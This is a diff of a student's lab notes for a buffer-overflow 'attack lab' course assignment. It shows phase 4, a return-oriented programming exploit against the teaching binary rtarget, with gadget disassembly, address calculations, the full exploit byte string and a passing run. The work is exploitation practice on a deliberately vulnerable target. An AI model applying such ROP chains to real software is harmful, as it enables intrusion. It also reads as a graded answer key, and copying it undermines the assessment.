@@ -7,6 +7,8 @@ objdump -d ctarget
 objdump -d rtarget
 // copy all the assembly code into a Google docs file
 
+Cyberduck: click “Open Connection”, select “SFTP”, type “lnxsrv.seas.ucla.edu” for Server, and my username and password, and click connect.
+
 [jieyun@lnxsrv09 ~/target164]$ chmod +x ctarget // since permission was denied the first time I ran ctarget
 [jieyun@lnxsrv09 ~/target164]$ chmod +x rtarget
 [jieyun@lnxsrv09 ~/target164]$ chmod +x hex2raw
@@ -304,7 +306,103 @@ NICE JOB!
 //                                              Phase 4                                               //
 ////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+// According to the spec, “All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.”
+// The key is to send my cookie into touch2 function. The easiest way to do so is to store my cookie into %rsp and then pop it. The byte representation for “popq %rdi” is “5f”. 
+
+// Try to do an exploit as follows:
+popq %rax         // Byte representation: “58”
+movq %rax %rdi    // Byte representation: “48 89 c7”
+ret               // Byte representation: “c3”
+
+00000000004018f5 <start_farm>:
+  4018f5:	b8 01 00 00 00       	mov    $0x1,%eax
+  4018fa:	c3                   	retq   
+
+00000000004018fb <addval_432>:
+  4018fb:	8d 87 48 89 c7 c7    	lea    -0x383876b8(%rdi),%eax
+  401901:	c3                   	retq   
+
+0000000000401902 <addval_153>:
+  401902:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  401908:	c3                   	retq   
+
+0000000000401909 <addval_366>:
+  401909:	8d 87 c1 58 90 c3    	lea    -0x3c6fa73f(%rdi),%eax     // contains the byte representation “58”
+
+  40190f:	c3                   	retq   
+
+0000000000401910 <getval_307>:
+  401910:	b8 c7 58 90 c3       	mov    $0xc39058c7,%eax
+  401915:	c3                   	retq   
+
+0000000000401916 <setval_359>:
+  401916:	c7 07 48 89 c7 c1    	movl   $0xc1c78948,(%rdi)
+  40191c:	c3                   	retq   
+
+000000000040191d <setval_468>:
+  40191d:	c7 07 48 90 90 c3    	movl   $0xc3909048,(%rdi)
+  401923:	c3                   	retq   
+
+0000000000401924 <addval_145>:
+  401924:	8d 87 45 58 94 90    	lea    -0x6f6ba7bb(%rdi),%eax
+  40192a:	c3                   	retq   
+
+000000000040192b <addval_406>:
+  40192b:	8d 87 26 48 89 c7    	lea    -0x3876b7da(%rdi),%eax     // contains “48 89 c7”
+  401931:	c3                   	retq   
+
+0000000000401932 <mid_farm>:
+
+// For the first gadget, the address for “58” is at address 0x401910 + 2 bytes = 0x401912, which is “12 19 40” in little endian.
+  401910:	b8 c7 58 90 c3       	mov    $0xc39058c7,%eax
+  401915:	c3                   	retq   
+
+// For the second gadget, the address for “48 89 c7 c3” starts at address 0x40192b + 3 bytes = 0x40192e, which is “2e 19 40” in little endian.
+000000000040192b <addval_406>:
+  40192b:	8d 87 26 48 89 c7    	lea    -0x3876b7da(%rdi),%eax
+  401931:	c3                   	retq   
+
+// My cookie is 0x4e99cb1b, which is “1b cb 99 4e” in little endian.
+
+// The exploit string should be:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 // 56 bytes of padding
+12 19 40 00 00 00 00 00 // first gadget
+1b cb 99 4e 00 00 00 00 // my cookie
+2e 19 40 00 00 00 00 00 // second gadget
+99 17 40 00 00 00 00 00 // touch2 function address
+
+In fact, there are many possibilities that MAY be able to work, so I tested all of them out of curiosity.
+gadget 1 can be:
+401909 + 3 = 40190c // worked
+401910 + 2 = 401912 // worked
+401924 + 3 = 401927 // Segmentation fault
+
+gadget 2 can be:
+4018fb + 2 = 4018fd // Ouch!: You caused a segmentation fault!
+401902 + 2 = 401904 // worked
+401916 + 2 = 401918 // Oops!: You executed an illegal instruction
+40192b + 3 = 40192e // worked
+
+[jieyun@lnxsrv09 ~/target164]$ ./hex2raw < phase4.txt > raw-phase4.txt
+[jieyun@lnxsrv09 ~/target164]$ ./rtarget < raw-phase4.txt
+// note that this should be rtarget, not target now
+
+Cookie: 0x4e99cb1b
+Type string:Touch2!: You called touch2(0x4e99cb1b)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
 
 
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+//                                              Phase 5                                               //
+////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 
